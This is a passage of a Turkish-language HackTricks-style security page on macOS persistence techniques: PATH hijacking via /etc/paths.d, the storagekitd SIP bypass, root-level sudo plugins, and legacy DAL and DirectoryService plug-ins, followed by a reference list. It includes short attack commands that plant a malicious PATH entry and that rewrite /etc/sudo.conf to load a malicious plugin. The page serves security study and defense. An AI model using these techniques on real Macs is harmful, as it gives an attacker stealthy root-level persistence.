Her ikisinin de sahibi root'tur. Saldırganın kontrolündeki bir dizini öne eklemek (`/etc/paths` dosyasını düzenleyerek veya `/etc/paths.d/` içine bir dosya bırakarak), bu dizinin oturum açılan her yeni kabuğun `PATH`'inde erken görünmesini sağlar; böylece yaygın bir komutla (`ls`, `git`, …) aynı adı taşıyan kötü amaçlı bir binary gerçek komutu **gölgeler** ve kurban komutu bir sonraki çalıştırdığında devreye girer.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Sandbox bypass için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (root gerekir)
- Root gerekir; sonuç **SIP bypass** sağlar. Etkilenen macOS sürümleri: **15.0–15.1**; **15.2** sürümünde düzeltildi.

#### Konum

- **`/Library/Filesystems/`** içine bir filesystem bundle bırakın.

#### Açıklama ve Exploitation

`storagekitd`, **`com.apple.rootless.install.heritable`** entitlement'ına sahiptir ve filesystem bundle ikililerini bu SIP bypass yeteneğini **devralmış** şekilde başlatır. Saldırgan, kötü amaçlı bir filesystem bundle yerleştirerek SIP bypass ile kod çalıştırabilir ve **kalıcı kernel extension'lar** yükleyebilir veya SIP korumalı `LaunchDaemon` dizinlerine yazabilir. Bu kalıcılık, normal korumalara rağmen varlığını sürdürür ve onları etkisiz kılar.<sup>[[46]](#references)</sup> Apple bu sorunu macOS Sequoia 15.2'de düzeltti.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Sandbox bypass için kullanışlı: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf` dosyasına yazmak için root gerekir)
- Yüklemek için root gerekir; plugin daha sonra **her `sudo` çağrısında** çalışır (setuid-root bağlamında)

#### Konum

- **`/etc/sudo.conf`** — `Plugin` satırları, paylaşımlı nesneleri **`/usr/libexec/sudo/`** dizininden (veya mutlak bir yoldan) yükler. Bu dosya varsayılan olarak bulunmadığından (sudo yerleşik bir policy kullanır), oluşturulması temiz bir hook sağlar.

#### Açıklama ve Exploitation

`sudo`, policy/approval/audit plugin'lerini `/etc/sudo.conf` dosyasından yükler. `sudo` setuid-root olduğundan, kötü amaçlı bir paylaşımlı nesne plugin'i **herhangi bir kullanıcı `sudo` çalıştırdığında root ayrıcalıklarıyla** çalışır. Bu, her sudo komutunu da görebilen kalıcı bir root erişimi sağlar.<sup>[[51]](#references)</sup> macOS, plugin API'sini destekleyen sudo 1.9.x sürümünü içerir.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimal örnek: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Eski mekanizma:** macOS 12.3'ten beri kullanımdan kaldırılmıştır. macOS 14.1 ve sonraki sürümler, eski video plug-in'lerini varsayılan olarak devre dışı bırakır. Bu yolun çalışması için kullanıcının Recovery üzerinden eski video desteğini yeniden etkinleştirmesi gerekir; yalnızca yazılabilir bir dizinin bulunması yeterli değildir. [Apple'ın güncel destek yönergeleri](https://support.apple.com/en-us/108387).
- Plug-in dizinine yazmak için root gerekir. Kod çalıştırılması, DAL plug-in'lerini hâlâ yükleyen uyumlu bir istemciye bağlıdır; bu durum macOS 26'da çalışma zamanında test edilmemiştir.

#### Konum

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root gerekir
  - **Tetikleyici:** Uyumlu bir kamera istemcisi, **eski destek yeniden etkinleştirildikten sonra** aygıtları listeler. İstemcinin library validation özelliği üçüncü taraf bir plug-in'i engelleyebilir.

#### Açıklama ve Exploitation

CoreMediaIO **DAL** (Device Abstraction Layer) plug-in'leri, bazı kamera uygulamaları tarafından işlem içinde yüklenirdi. Apple'ın [kamera eklentisi sunumu](https://developer.apple.com/videos/play/wwdc2022/10022/), eski DAL plug-in'lerinin FaceTime, QuickTime Player veya Photo Booth ile **çalışmadığını** ve diğer birçok istemcinin library validation uyguladığını özellikle belirtir. Modern [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio), ayrı bir kurulum ve onay modeliyle işlem dışında çalışır. Geçmişteki işlem içi teknik, güncel macOS'ta genel bir Camera TCC bypass olduğu anlamına gelmez.<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26'da salt okunur gözlem: `/Library/CoreMediaIO/Plug-Ins/DAL` dizini mevcut ve root'a aittir. Ne eski destek ne de herhangi bir istemcide yükleme doğrulanmıştır.

### Directory Service Plug-in'leri

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Eski, koşullu mekanizma:** Kurulum için root ve gerçekten yapılandırılmış ve yüklenmiş bir plug-in gerekir. DirectoryService'in plug-in API'si kullanımdan kaldırılmıştır; bunu bir boot tetikleyicisi olarak değerlendirmeden önce hedef Mac'in Open Directory yapılandırmasını inceleyin.

#### Konum

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root gerekir
  - **Tetikleyici:** Open Directory ihtiyaç duyduğunda `dspluginhelperd`, uygun ve yapılandırılmış bir plug-in'i yükler. [Apple'ın plug-in çalışma zamanı kılavuzu](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html), başlangıç için yapılandırılmamış plug-in'lerin ilgili node açıldığında gecikmeli olarak yüklenebileceğini belirtir.

#### Açıklama ve Exploitation

`dspluginhelperd`, eski DirectoryService plug-in bundle'larını destekler. Eski plug-in'in kabul edilip etkinleştirildiği durumlarda kötü amaçlı bir plug-in, PAM ve Authorization Plugins'ten farklı, ayrıcalıklı bir kod çalıştırma yolu sağlayabilir. Dizinin mevcut olması, yeni yazılan bir plug-in'in bir sonraki boot'ta çalışacağını göstermez. macOS 26.5'teki yerel `dspluginhelperd(8)` ve `opendirectoryd(8)` kılavuzları hâlâ bu helper'ı ve eski yolu listeler.<sup>[[53]](#references)</sup>

macOS 26'da salt okunur gözlem: `/Library/DirectoryServices/PlugIns` ve `/usr/libexec/dspluginhelperd` mevcut. Bu test sırasında hiçbir plug-in kurulmadı, yapılandırılmadı veya yüklenmedi.

## Persistence teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, Infostealer'ların yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Klasik LaunchAgents'ın ötesinde - 1 - shell başlangıç dosyaları](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Klasik LaunchAgents'ın ötesinde - 18 - X11 ve XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Klasik LaunchAgents'ın ötesinde - 21 - Yeniden açılan uygulamalar](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Klasik LaunchAgents'ın ötesinde - 20 - Terminal tercihleri](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Klasik LaunchAgents'ın ötesinde - 13 - Audio plug-in'leri](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-in'leri (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Klasik LaunchAgents'ın ötesinde - 12 - QuickLook plug-in'leri](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Klasik LaunchAgents'ın ötesinde - 22 - LoginHook ve LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Klasik LaunchAgents'ın ötesinde - 4 - cron işleri](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Klasik LaunchAgents'ın ötesinde - 2 - iTerm2 başlangıcı](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Klasik LaunchAgents'ın ötesinde - 7 - xbar plug-in'leri](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Klasik LaunchAgents'ın ötesinde - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Klasik LaunchAgents'ın ötesinde - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Klasik LaunchAgents'ın ötesinde - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Klasik LaunchAgents'ın ötesinde - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Klasik LaunchAgents'ın ötesinde - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS'ta persistence için Folder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Klasik LaunchAgents'ın ötesinde - 27 - Dock kısayolları](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Klasik LaunchAgents'ın ötesinde - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Klasik LaunchAgents'ın ötesinde - 26 - Finder Sync plug-in'leri](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" persistence'ının analizi (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Klasik LaunchAgents'ın ötesinde - 16 - Ekran koruyucu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Erişiminizi koruyun: macOS'ta persistence için ekran koruyucular (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Klasik LaunchAgents'ın ötesinde - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Klasik LaunchAgents'ın ötesinde - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Klasik LaunchAgents'ın ötesinde - 19 - Periyodik script'ler](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Klasik LaunchAgents'ın ötesinde - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Klasik LaunchAgents'ın ötesinde - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugins ile kalıcı kimlik bilgisi hırsızlığı (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Klasik LaunchAgents'ın ötesinde - 30 - man yapılandırma dosyası - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Klasik LaunchAgents'ın ötesinde - 25 - Apache2 modülleri](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Klasik LaunchAgents'ın ötesinde - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Klasik LaunchAgents'ın ötesinde - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Klasik LaunchAgents'ın ötesinde - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Klasik LaunchAgents'ın ötesinde - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Klasik LaunchAgents'ın ötesinde - 10 - Uygulama script dosyaları](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Klasik LaunchAgents'ın ötesinde - 32 - Dock Tile plug-in'leri](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Klasik LaunchAgents'ın ötesinde - 33 - Widget'lar](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Klasik LaunchAgents'ın ötesinde - 34 - launchd boot görevleri](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Klasik LaunchAgents'ın ötesinde - 35 - NVRAM üzerinden persistence (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS X'te persistence için e-posta kullanımı (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Şüpheli Apple Mail Rule Plist değişikliği (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Kötü amaçlı profiller - Mac'lere yönelik en ciddi tehditlerden biri (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Mac Malware'ın Sanatı Cilt 1 - Bölüm 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243'ü analiz etme: kernel extension'ları üzerinden macOS SIP bypass (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Code proje dosyaları üzerinden RCE ve API token sızdırma (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot ve Cursor'daki yeni güvenlik açığı - Rules dosyası backdoor'u (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Alternatif kurulum yöntemleri (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Mac'te Chrome'dan ExtensionInstallForcelist'i kaldırma (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo plug-in'leri yazma üzerine (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Özel URL şemaları üzerinden uzaktan Mac exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Plug-in'leri kötüye kullanan iki macOS persistence tekniği (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL minimal örneği (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Spotlight tabanlı bir macOS TCC güvenlik açığını analiz etme (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` modülü belgeleri (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Spotlight'tan Apple Intelligence'a — macOS AI'ı besleyen verileri çalmak için bir 0day'i kötüye kullanma](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
